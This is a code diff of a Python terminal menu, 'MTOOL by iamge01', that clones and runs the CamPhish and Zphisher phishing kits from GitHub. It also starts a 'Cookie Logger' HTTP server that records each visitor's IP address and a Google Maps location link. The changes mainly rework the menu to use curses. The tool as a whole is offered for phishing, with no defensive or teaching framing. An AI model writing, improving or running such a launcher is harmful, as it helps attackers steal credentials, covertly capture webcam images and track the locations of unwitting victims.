@@ -1,9 +1,9 @@
 import os
 import subprocess
 from http.server import BaseHTTPRequestHandler, HTTPServer
-import sys
-import time
+import curses
 
+# Define tool functions
 def download_camphish():
     repo_url = "https://github.com/techchipnet/CamPhish.git"
     directory = "CamPhish"
@@ -12,12 +12,8 @@ def download_camphish():
             print("[*] Cloning CamPhish from", repo_url, "...")
             subprocess.run(["git", "clone", repo_url], check=True)
             print("[*] CamPhish downloaded successfully.")
-            print("[*] Starting CamPhish...")
-            subprocess.run(["bash", f"{directory}/camphish.sh"], check=True)
-        else:
-            print("[*] CamPhish is already downloaded.")
-            print("[*] Starting CamPhish...")
-            subprocess.run(["bash", f"{directory}/camphish.sh"], check=True)
+        print("[*] Starting CamPhish...")
+        subprocess.run(["bash", f"{directory}/camphish.sh"], check=True)
     except Exception as e:
         print("[!] Error handling CamPhish:", e)
 
@@ -29,12 +25,8 @@ def download_zphisher():
             print("[*] Cloning Zphisher from", repo_url, "...")
             subprocess.run(["git", "clone", repo_url], check=True)
             print("[*] Zphisher downloaded successfully.")
-            print("[*] Starting Zphisher...")
-            subprocess.run(["bash", f"{directory}/zphisher.sh"], check=True)
-        else:
-            print("[*] Zphisher is already downloaded.")
-            print("[*] Starting Zphisher...")
-            subprocess.run(["bash", f"{directory}/zphisher.sh"], check=True)
+        print("[*] Starting Zphisher...")
+        subprocess.run(["bash", f"{directory}/zphisher.sh"], check=True)
     except Exception as e:
         print("[!] Error handling Zphisher:", e)
 
@@ -61,7 +53,7 @@ def start_cookie_logger():
 
     try:
         with open(file_name, "w") as f:
-            f.write("IP Address, Location (Google Maps URL)\n")  # Add headers for the log file
+            f.write("IP Address, Location (Google Maps URL)\n")
 
         class LoggingHandler(BaseHTTPRequestHandler):
             def do_GET(self):
@@ -88,41 +80,41 @@ def start_cookie_logger():
     except Exception as e:
         print("[!] Error starting Cookie Logger:", e)
 
-def main():
-    menu_options = ["CamPhish", "Zphisher", "Text Logger"]
+# Main menu function
+def main_menu(stdscr):
+    curses.curs_set(0)  # Hide the cursor
+
+    menu_options = ["CamPhish", "Zphisher", "Cookie Logger"]
     selected_index = 0
 
-    def render_menu():
-        os.system("clear")
-        print("="*50)
-        print("  Welcome to the Tool Selector! Choose an option:")
-        print("="*50)
+    while True:
+        stdscr.clear()
+        stdscr.addstr("=" * 50 + "\n")
+        stdscr.addstr(" WELCOME TO MTOOL BY iamge01\n")
+        stdscr.addstr("=" * 50 + "\n")
+
         for i, option in enumerate(menu_options):
             if i == selected_index:
-                print("> {} <".format(option))
+                stdscr.addstr(f"> {option} <\n", curses.A_REVERSE)
             else:
-                print("  ", option)
+                stdscr.addstr(f"  {option}\n")
 
-    def on_input():
-        nonlocal selected_index
-        print("\nUse the number to select an option:")
-        try:
-            selection = int(input("\nEnter your choice (1-3): ").strip())
-            if selection == 1:
+        key = stdscr.getch()
+
+        if key == curses.KEY_UP and selected_index > 0:
+            selected_index -= 1
+        elif key == curses.KEY_DOWN and selected_index < len(menu_options) - 1:
+            selected_index += 1
+        elif key == curses.KEY_ENTER or key in [10, 13]:
+            if selected_index == 0:
                 download_camphish()
-            elif selection == 2:
+            elif selected_index == 1:
                 download_zphisher()
-            elif selection == 3:
+            elif selected_index == 2:
                 start_cookie_logger()
-            else:
-                print("[!] Invalid selection.")
-                on_input()  # Recurse to prompt again
-        except ValueError:
-            print("[!] Please enter a valid number.")
-            on_input()  # Recurse to prompt again
+            break  # Exit menu loop after selection
 
-    render_menu()
-    on_input()
+        stdscr.refresh()
 
 if __name__ == "__main__":
-    main()
+    curses.wrapper(main_menu)
